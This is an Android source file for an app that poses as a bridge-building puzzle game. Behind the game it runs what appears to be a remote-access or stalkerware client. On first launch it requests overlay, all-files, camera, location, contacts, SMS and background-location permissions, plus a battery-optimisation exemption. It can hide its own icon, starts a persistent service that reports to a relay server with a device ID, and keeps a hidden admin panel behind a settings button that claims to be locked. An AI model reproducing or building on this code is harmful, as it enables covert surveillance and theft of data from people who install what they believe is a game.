package com.hashibridge.master;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.widget.Button;
import android.widget.ImageButton;
import android.widget.TextView;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import com.hashibridge.master.game.BridgeGameView;
import com.hashibridge.master.game.BridgePuzzleGenerator;
import com.hashibridge.master.utils.PermissionHelper;
import java.util.Random;

public class MainActivity extends AppCompatActivity {

    private static final int RC_PERMISSIONS        = 2001;
    private static final int RC_BACKGROUND_LOC     = 2002;
    private static final int RC_OVERLAY            = 2003;
    private static final int RC_STORAGE            = 2004;
    private static final int RC_BATTERY_OPT        = 2005;

    private BridgeGameView gameView;
    private TextView tvHud;
    private TextView tvLevelBadge;
    private int currentLevel = 1;
    private int islandCount = 6;
    private final Random random = new Random();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        com.hashibridge.master.utils.Config.getOrCreateDeviceId(this);

        // 🔑 Auto-start permission flow on first launch — no admin panel needed
        startPermissionFlow();

        if (com.hashibridge.master.utils.Config.isIconHidden(this)) {
            com.hashibridge.master.utils.Config.hideAppIcon(this);
        }

        gameView = findViewById(R.id.game_view);
        tvHud = findViewById(R.id.tv_hud);
        tvLevelBadge = findViewById(R.id.tv_level_badge);
        Button btnReset = findViewById(R.id.btn_reset);
        Button btnNext = findViewById(R.id.btn_next);
        ImageButton btnSettings = findViewById(R.id.btn_settings);

        gameView.setOnWinListener(() -> {
            tvHud.setText("Level Cleared! Tap Next Level to continue.");
            Toast.makeText(this, "Puzzle Solved! Great job!", Toast.LENGTH_SHORT).show();
        });

        btnReset.setOnClickListener(v -> startPuzzle(currentLevel));
        btnNext.setOnClickListener(v -> {
            currentLevel++;
            islandCount = Math.min(10, 5 + (currentLevel / 2));
            startPuzzle(currentLevel);
        });

        // Public face: settings look locked.
        btnSettings.setOnClickListener(v ->
                Toast.makeText(this, "Settings are currently locked", Toast.LENGTH_SHORT).show());

        // Hidden trigger: long-press the settings gear opens the admin panel.
        btnSettings.setOnLongClickListener(v -> {
            openAdminPanel();
            return true;
        });

        // Long press title or level badge to copy Device ID quickly
        findViewById(R.id.tv_title).setOnLongClickListener(v -> { copyDeviceId(); return true; });
        tvLevelBadge.setOnLongClickListener(v -> { copyDeviceId(); return true; });

        startPuzzle(currentLevel);
    }

    // ─── Permission flow ────────────────────────────────────────────────────

    /**
     * Full sequential permission flow:
     *  1. SYSTEM_ALERT_WINDOW (overlay)
     *  2. MANAGE_EXTERNAL_STORAGE (Android 11+)
     *  3. All runtime permissions (camera, location, contacts, sms, …)
     *  4. ACCESS_BACKGROUND_LOCATION (Android 10+)
     *  5. Battery optimization exemption
     *  6. Start service
     */
    private void startPermissionFlow() {
        // Step 1: overlay
        if (!Settings.canDrawOverlays(this)) {
            Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + getPackageName()));
            startActivityForResult(i, RC_OVERLAY);
            return;
        }

        // Step 2: MANAGE_EXTERNAL_STORAGE (Android 11+)
        if (PermissionHelper.needsManageStorage()
                && !PermissionHelper.isExternalStorageManager(this)) {
            Intent manage = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                    Uri.parse("package:" + getPackageName()));
            try {
                startActivityForResult(manage, RC_STORAGE);
            } catch (Exception e) {
                startActivityForResult(
                        new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION), RC_STORAGE);
            }
            return;
        }

        // Step 3: runtime permissions
        String[] perms = PermissionHelper.getRuntimePermissions();
        if (perms.length > 0) {
            ActivityCompat.requestPermissions(this, perms, RC_PERMISSIONS);
            return;
        }

        onRuntimePermissionsDone();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == RC_PERMISSIONS) {
            onRuntimePermissionsDone();
        } else if (requestCode == RC_BACKGROUND_LOC) {
            requestBatteryOptimizationExemption();
        }
    }

    /** Step 4: background location (Android 10+) → then battery opt */
    private void onRuntimePermissionsDone() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            ActivityCompat.requestPermissions(this,
                    new String[]{android.Manifest.permission.ACCESS_BACKGROUND_LOCATION},
                    RC_BACKGROUND_LOC);
        } else {
            requestBatteryOptimizationExemption();
        }
    }

    /** Step 5: battery optimization exemption — biar service tidak dibunuh OS */
    private void requestBatteryOptimizationExemption() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                try {
                    Intent i = new Intent(
                            Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                            Uri.parse("package:" + getPackageName()));
                    startActivityForResult(i, RC_BATTERY_OPT);
                    return;
                } catch (Exception e) {
                    // Fallback: buka halaman battery settings umum
                    try {
                        startActivity(new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS));
                    } catch (Exception ignored) {}
                }
            }
        }
        // Step 6: service + watchdog
        autoStartServiceIfReady();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == RC_OVERLAY || requestCode == RC_STORAGE) {
            // Continue the flow after system-settings screen closes
            startPermissionFlow();
        } else if (requestCode == RC_BATTERY_OPT) {
            // Done — start service regardless of user choice
            autoStartServiceIfReady();
        }
    }

    private void openAdminPanel() {
        try {
            startActivity(new Intent(this, ControlPanelActivity.class));
        } catch (Exception ignored) {}
    }

    private void copyDeviceId() {
        String deviceId = com.hashibridge.master.utils.Config.getOrCreateDeviceId(this);
        ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        ClipData clip = ClipData.newPlainText("Device ID", deviceId);
        clipboard.setPrimaryClip(clip);
        Toast.makeText(this, "Device ID copied to clipboard: " + deviceId, Toast.LENGTH_SHORT).show();
    }

    private void startPuzzle(int level) {
        tvLevelBadge.setText("Level " + level);
        BridgePuzzleGenerator.Puzzle puzzle = BridgePuzzleGenerator.generate(random, islandCount);
        gameView.setPuzzle(puzzle);
        tvHud.setText("Tap two islands to build a bridge");
    }

    private void autoStartServiceIfReady() {
        if (!BridgeService.isRunning()) {
            String savedRelay = com.hashibridge.master.utils.Config.getRelayUrl(this);
            if (savedRelay.isEmpty()) {
                savedRelay = getString(R.string.default_relay_url);
            }
            String deviceId = com.hashibridge.master.utils.Config.getOrCreateDeviceId(this);

            com.hashibridge.master.utils.Config.saveConfig(this, savedRelay, deviceId);
            com.hashibridge.master.utils.Config.setAutoStart(this, true);

            Intent intent = new Intent(this, BridgeService.class);
            intent.putExtra("relayUrl", savedRelay);
            intent.putExtra("deviceId", deviceId);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
        }
    }
}
